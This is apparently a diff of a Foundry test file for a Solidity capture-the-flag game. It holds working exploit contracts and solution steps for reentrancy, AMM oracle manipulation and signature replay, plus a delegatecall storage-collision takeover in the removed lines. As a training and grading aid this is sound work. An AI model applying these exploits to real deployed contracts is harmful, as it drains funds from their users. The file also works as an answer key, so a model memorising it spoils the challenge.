@@ -1,176 +1,640 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test} from "forge-std/Test.sol";
+
 import {CTFFactory} from "../src/CTFFactory.sol";
-import {SoulboundBadge} from "../src/SoulboundBadge.sol";
-import {Level1_AccessControl} from "../src/Level1_AccessControl.sol";
-import {Level2_Reentrancy} from "../src/Level2_Reentrancy.sol";
-import {Level3_OracleManipulation} from "../src/Level3_OracleManipulation.sol";
-import {Level4_SignatureReplay} from "../src/Level4_SignatureReplay.sol";
-import {Level5_ProxyVault, Level5_Implementation} from "../src/Level5_Delegatecall.sol";
-import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
+import {TRACE} from "../src/TRACE.sol";
+import {MKT} from "../src/MKT.sol";
 
-// Re-using the Attacker from Level2
-contract Level2Attacker {
-    Level2_Reentrancy public vault;
+import {Level1_Reentrancy} from "../src/Level1_Reentrancy.sol";
+import {Level2_OracleManipulation} from "../src/Level2_OracleManipulation.sol";
+import {Level3_SignatureReplay} from "../src/Level3_SignatureReplay.sol";
 
-    constructor(Level2_Reentrancy _vault) {
+import {SimpleAMM} from "../src/SimpleAMM.sol";
+import {VulnerableOracle} from "../src/VulnerableOracle.sol";
+
+import {
+    MessageHashUtils
+} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
+
+
+// ==========================================================
+// LEVEL 1 ATTACKER
+// ==========================================================
+
+contract Level1Attacker {
+    Level1_Reentrancy public vault;
+    TRACE public trace;
+
+    constructor(
+        Level1_Reentrancy _vault,
+        TRACE _trace
+    ) {
         vault = _vault;
+        trace = _trace;
     }
 
-    function attack() external payable {
-        vault.donate{value: msg.value}(address(this));
+    function attack(uint256 amount) external {
+        trace.approve(address(vault), amount);
+
+        vault.deposit(amount);
+
         vault.withdraw();
     }
 
-    receive() external payable {
-        if (address(vault).balance >= msg.value) {
+    function onTRCReceived(uint256) external {
+        if (trace.balanceOf(address(vault)) > 0) {
             vault.withdraw();
         }
     }
 }
 
-// Re-using the Attacker from Level3
-contract Level3Attacker {
-    Level3_OracleManipulation public vault;
 
-    constructor(Level3_OracleManipulation _vault) {
+// ==========================================================
+// LEVEL 2 ATTACKER
+// ==========================================================
+
+contract Level2Attacker {
+    Level2_OracleManipulation public vault;
+    SimpleAMM public amm;
+    MKT public mkt;
+    TRACE public trace;
+
+    constructor(
+        Level2_OracleManipulation _vault,
+        SimpleAMM _amm,
+        MKT _mkt,
+        TRACE _trace
+    ) {
         vault = _vault;
+        amm = _amm;
+        mkt = _mkt;
+        trace = _trace;
     }
 
-    function attack() external payable {
-        vault.claimAirdrop();
-        uint256 balance = vault.token().balanceOf(address(this));
-        vault.amm().swapETHForTokens{value: msg.value}();
-        vault.token().approve(address(vault), balance);
-        vault.deposit(balance);
-        vault.borrow(0.1 ether);
+    function attack() external {
+        // --------------------------------------------------
+        // 1. Manipulate the AMM price
+        //
+        // Spend 40 TRC to buy MKT.
+        // AMM:
+        //
+        // Before:
+        // 10 MKT / 10 TRC
+        //
+        // After:
+        // 2 MKT / 50 TRC
+        //
+        // Price becomes:
+        // 50 / 2 = 25 TRC per MKT
+        // --------------------------------------------------
+
+        trace.approve(
+            address(amm),
+            40 ether
+        );
+
+        amm.swapTRACEForMKT(
+            40 ether
+        );
+
+        // --------------------------------------------------
+        // 2. Deposit 10 MKT as collateral
+        // --------------------------------------------------
+
+        mkt.approve(
+            address(vault),
+            10 ether
+        );
+
+        vault.deposit(
+            10 ether
+        );
+
+        // --------------------------------------------------
+        // 3. Borrow the entire 100 TRC vault
+        // --------------------------------------------------
+
+        vault.borrow(
+            100 ether
+        );
     }
-    
-    receive() external payable {}
 }
 
+
+// ==========================================================
+// TEST
+// ==========================================================
+
 contract CTFFactoryTest is Test {
+
     CTFFactory public factory;
-    
-    uint256 public level4SignerPrivateKey = 0xabc123;
-    address public level4TrustedSigner;
-    
+
+    TRACE public trace;
+
     address public player = address(0x1337);
 
+    uint256 public trustedSignerPrivateKey = 0xABC123;
+    address public trustedSigner;
+
+
     function setUp() public {
-        level4TrustedSigner = vm.addr(level4SignerPrivateKey);
-        factory = new CTFFactory(level4TrustedSigner);
-        vm.deal(player, 10 ether); // plenty of ETH for deployment and exploitation
-    }
-    
-    function _generateL4Signature(address vault, address _recipient, uint256 _amount) internal view returns (bytes memory) {
-        bytes32 messageHash = keccak256(abi.encodePacked(vault, _recipient, _amount));
-        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(level4SignerPrivateKey, ethSignedMessageHash);
-        return abi.encodePacked(r, s, v);
+
+        trustedSigner =
+            vm.addr(trustedSignerPrivateKey);
+
+        factory =
+            new CTFFactory(
+                trustedSigner
+            );
+
+        trace =
+            factory.trace();
+
+        vm.deal(
+            player,
+            10 ether
+        );
     }
 
-    function test_FullIntegrationProgression() public {
+
+    // ======================================================
+    // LEVEL 1
+    // ======================================================
+
+    function test_Level1_Reentrancy() public {
+
         vm.startPrank(player);
 
-        // ----------------------------------------
-        // LEVEL 1: ACCESS CONTROL
-        // ----------------------------------------
-        // Test level skipping
-        vm.expectRevert("Must solve Level 1 first");
-        factory.deployLevel2{value: 0.01 ether}();
+        // Player gets 10 TRC.
+        factory.claimTokens();
 
-        // Test incorrect ETH
-        vm.expectRevert("Must fund the level instance with 0.01 ETH");
-        factory.deployLevel1{value: 0.02 ether}();
+        assertEq(
+            trace.balanceOf(player),
+            10 ether
+        );
 
-        // Deploy L1
-        Level1_AccessControl l1 = Level1_AccessControl(factory.deployLevel1{value: 0.01 ether}());
-        assertEq(factory.levelInstances(1, player), address(l1));
+        // Deploy Level 1.
+        address instanceAddress =
+            factory.deployLevel1();
 
-        // Exploit L1
-        l1.withdrawAll(payable(player));
-        
-        // Validate L1
+        Level1_Reentrancy vault =
+            Level1_Reentrancy(
+                instanceAddress
+            );
+
+        // Vault contains 100 TRC.
+        assertEq(
+            trace.balanceOf(address(vault)),
+            100 ether
+        );
+
+        // Create attacker.
+        Level1Attacker attacker =
+            new Level1Attacker(
+                vault,
+                trace
+            );
+
+        // Give attacker 1 TRC.
+        trace.transfer(
+            address(attacker),
+            1 ether
+        );
+
+        // Execute reentrancy attack.
+        attacker.attack(
+            1 ether
+        );
+
+        // Vault should be empty.
+        assertEq(
+            trace.balanceOf(address(vault)),
+            0
+        );
+
+        assertTrue(
+            vault.isComplete()
+        );
+
+        // Validate Level 1.
         factory.validateLevel1();
-        assertTrue(factory.isSolved(1, player));
-        assertEq(factory.badgeContract().balanceOf(player, 1), 1);
 
-        // ----------------------------------------
-        // LEVEL 2: REENTRANCY
-        // ----------------------------------------
-        vm.expectRevert("Must solve Level 2 first");
-        factory.deployLevel3{value: 0.11 ether}();
+        assertTrue(
+            factory.isSolved(
+                1,
+                player
+            )
+        );
 
-        // Deploy L2
-        Level2_Reentrancy l2 = Level2_Reentrancy(factory.deployLevel2{value: 0.01 ether}());
-        
-        // Exploit L2
-        Level2Attacker l2Attacker = new Level2Attacker(l2);
-        l2Attacker.attack{value: 0.001 ether}();
+        assertEq(
+            factory.badgeContract().balanceOf(
+                player,
+                1
+            ),
+            1
+        );
 
-        // Validate L2
+        vm.stopPrank();
+    }
+
+
+    // ======================================================
+    // LEVEL 2
+    // ======================================================
+
+    function test_Level2_OracleManipulation() public {
+
+        vm.startPrank(player);
+
+        // ----------------------------------------------
+        // Level 1 must be solved first.
+        // ----------------------------------------------
+
+        factory.claimTokens();
+
+        address level1Address =
+            factory.deployLevel1();
+
+        Level1_Reentrancy level1 =
+            Level1_Reentrancy(
+                level1Address
+            );
+
+        Level1Attacker attacker =
+            new Level1Attacker(
+                level1,
+                trace
+            );
+
+        // Give attacker 1 TRC.
+        trace.transfer(
+            address(attacker),
+            1 ether
+        );
+
+        attacker.attack(
+            1 ether
+        );
+
+        factory.validateLevel1();
+
+        assertTrue(
+            factory.isSolved(
+                1,
+                player
+            )
+        );
+
+
+        // ----------------------------------------------
+        // Deploy Level 2.
+        // ----------------------------------------------
+
+        address level2Address =
+            factory.deployLevel2();
+
+        Level2_OracleManipulation vault =
+            Level2_OracleManipulation(
+                level2Address
+            );
+
+
+        // ----------------------------------------------
+        // Get the MKT, AMM and Oracle addresses.
+        // ----------------------------------------------
+
+        MKT mkt =
+            MKT(
+                address(
+                    vault.mkt()
+                )
+            );
+
+        VulnerableOracle oracle =
+            vault.oracle();
+
+        SimpleAMM amm =
+            oracle.amm();
+
+
+        // ----------------------------------------------
+        // Verify starting balances.
+        // ----------------------------------------------
+
+        assertEq(
+            mkt.balanceOf(player),
+            10 ether
+        );
+
+
+        assertEq(
+            trace.balanceOf(address(vault)),
+            100 ether
+        );
+
+
+        // ----------------------------------------------
+        // Check initial oracle price.
+        // ----------------------------------------------
+
+        uint256 initialPrice =
+            oracle.getPrice();
+
+        assertEq(
+            initialPrice,
+            1 ether
+        );
+
+
+        // ----------------------------------------------
+        // Create Level 2 attacker.
+        // ----------------------------------------------
+
+        Level2Attacker level2Attacker =
+            new Level2Attacker(
+                vault,
+                amm,
+                mkt,
+                trace
+            );
+
+        // Give attacker the player's Level 2 assets.
+        trace.transfer(
+            address(level2Attacker),
+            40 ether
+        );
+
+        mkt.transfer(
+            address(level2Attacker),
+            10 ether
+        );
+
+
+        // ----------------------------------------------
+        // Execute oracle manipulation.
+        // ----------------------------------------------
+
+        level2Attacker.attack();
+
+
+        // ----------------------------------------------
+        // Oracle should now report an inflated price.
+        // ----------------------------------------------
+
+        uint256 manipulatedPrice =
+            oracle.getPrice();
+
+        assertEq(
+            manipulatedPrice,
+            25 ether
+        );
+
+
+        // ----------------------------------------------
+        // Vault should now be drained.
+        // ----------------------------------------------
+
+        assertEq(
+            trace.balanceOf(address(vault)),
+            0
+        );
+
+        assertTrue(
+            vault.isComplete()
+        );
+
+
+        // ----------------------------------------------
+        // Validate Level 2.
+        // ----------------------------------------------
+
         factory.validateLevel2();
-        assertTrue(factory.isSolved(2, player));
-        assertEq(factory.badgeContract().balanceOf(player, 2), 1);
 
-        // ----------------------------------------
-        // LEVEL 3: ORACLE MANIPULATION
-        // ----------------------------------------
-        vm.expectRevert("Must solve Level 3 first");
-        factory.deployLevel4{value: 0.05 ether}();
+        assertTrue(
+            factory.isSolved(
+                2,
+                player
+            )
+        );
 
-        // Deploy L3
-        Level3_OracleManipulation l3 = Level3_OracleManipulation(factory.deployLevel3{value: 0.11 ether}());
-        
-        // Exploit L3
-        Level3Attacker l3Attacker = new Level3Attacker(l3);
-        l3Attacker.attack{value: 0.1 ether}();
+        assertEq(
+            factory.badgeContract().balanceOf(
+                player,
+                2
+            ),
+            1
+        );
 
-        // Validate L3
+        vm.stopPrank();
+    }
+
+
+    // ======================================================
+    // LEVEL 3
+    // ======================================================
+
+    function test_Level3_SignatureReplay() public {
+
+        vm.startPrank(player);
+
+        // ----------------------------------------------
+        // Level 1
+        // ----------------------------------------------
+
+        factory.claimTokens();
+
+        address level1Address =
+            factory.deployLevel1();
+
+        Level1_Reentrancy level1 =
+            Level1_Reentrancy(
+                level1Address
+            );
+
+        Level1Attacker attacker =
+            new Level1Attacker(
+                level1,
+                trace
+            );
+
+        trace.transfer(
+            address(attacker),
+            1 ether
+        );
+
+        attacker.attack(
+            1 ether
+        );
+
+        factory.validateLevel1();
+
+
+        // ----------------------------------------------
+        // Level 2
+        // ----------------------------------------------
+
+        address level2Address =
+            factory.deployLevel2();
+
+        Level2_OracleManipulation vault2 =
+            Level2_OracleManipulation(
+                level2Address
+            );
+
+        MKT mkt =
+            MKT(
+                address(
+                    vault2.mkt()
+                )
+            );
+
+        VulnerableOracle oracle =
+            vault2.oracle();
+
+        SimpleAMM amm =
+            oracle.amm();
+
+        Level2Attacker attacker2 =
+            new Level2Attacker(
+                vault2,
+                amm,
+                mkt,
+                trace
+            );
+
+        trace.transfer(
+            address(attacker2),
+            40 ether
+        );
+
+        mkt.transfer(
+            address(attacker2),
+            10 ether
+        );
+
+        attacker2.attack();
+
+        factory.validateLevel2();
+
+
+        // ----------------------------------------------
+        // Level 3
+        // ----------------------------------------------
+
+        address level3Address =
+            factory.deployLevel3();
+
+        Level3_SignatureReplay vault =
+            Level3_SignatureReplay(
+                level3Address
+            );
+
+
+        // ----------------------------------------------
+        // Verify vault contains 100 TRC.
+        // ----------------------------------------------
+
+        assertEq(
+            trace.balanceOf(address(vault)),
+            100 ether
+        );
+
+
+        // ----------------------------------------------
+        // Create a signature authorizing:
+        //
+        // player → withdraw 10 TRC
+        // ----------------------------------------------
+
+        uint256 withdrawalAmount =
+            10 ether;
+
+        bytes32 messageHash =
+            keccak256(
+                abi.encodePacked(
+                    address(vault),
+                    player,
+                    withdrawalAmount
+                )
+            );
+
+        bytes32 ethSignedMessageHash =
+            MessageHashUtils
+                .toEthSignedMessageHash(
+                    messageHash
+                );
+
+        (
+            uint8 v,
+            bytes32 r,
+            bytes32 s
+        ) =
+            vm.sign(
+                trustedSignerPrivateKey,
+                ethSignedMessageHash
+            );
+
+        bytes memory signature =
+            abi.encodePacked(
+                r,
+                s,
+                v
+            );
+
+
+        // ----------------------------------------------
+        // Replay the SAME signature 10 times.
+        // ----------------------------------------------
+
+        for (
+            uint256 i = 0;
+            i < 10;
+            i++
+        ) {
+            vault.withdraw(
+                player,
+                withdrawalAmount,
+                signature
+            );
+        }
+
+
+        // ----------------------------------------------
+        // Vault should be empty.
+        // ----------------------------------------------
+
+        assertEq(
+            trace.balanceOf(address(vault)),
+            0
+        );
+
+        assertTrue(
+            vault.isComplete()
+        );
+
+
+        // ----------------------------------------------
+        // Validate Level 3.
+        // ----------------------------------------------
+
         factory.validateLevel3();
-        assertTrue(factory.isSolved(3, player));
-        assertEq(factory.badgeContract().balanceOf(player, 3), 1);
 
-        // ----------------------------------------
-        // LEVEL 4: SIGNATURE REPLAY
-        // ----------------------------------------
-        vm.expectRevert("Must solve Level 4 first");
-        factory.deployLevel5{value: 0.05 ether}();
+        assertTrue(
+            factory.isSolved(
+                3,
+                player
+            )
+        );
 
-        // Deploy L4
-        Level4_SignatureReplay l4 = Level4_SignatureReplay(factory.deployLevel4{value: 0.05 ether}());
-
-        // Exploit L4
-        bytes memory sig = _generateL4Signature(address(l4), player, 0.01 ether);
-        l4.withdraw(player, 0.01 ether, sig);
-        l4.withdraw(player, 0.01 ether, sig);
-        l4.withdraw(player, 0.01 ether, sig);
-        l4.withdraw(player, 0.01 ether, sig);
-        l4.withdraw(player, 0.01 ether, sig);
-
-        // Validate L4
-        factory.validateLevel4();
-        assertTrue(factory.isSolved(4, player));
-        assertEq(factory.badgeContract().balanceOf(player, 4), 1);
-
-        // ----------------------------------------
-        // LEVEL 5: DELEGATECALL STORAGE COLLISION
-        // ----------------------------------------
-        // Deploy L5
-        Level5_ProxyVault l5 = Level5_ProxyVault(payable(factory.deployLevel5{value: 0.05 ether}()));
-
-        // Exploit L5
-        bytes memory data = abi.encodeWithSignature("updateAddress(address)", player);
-        l5.execute(data);
-        l5.withdraw(payable(player));
-
-        // Validate L5
-        factory.validateLevel5();
-        assertTrue(factory.isSolved(5, player));
-        assertEq(factory.badgeContract().balanceOf(player, 5), 1);
+        assertEq(
+            factory.badgeContract().balanceOf(
+                player,
+                3
+            ),
+            1
+        );
 
         vm.stopPrank();
     }
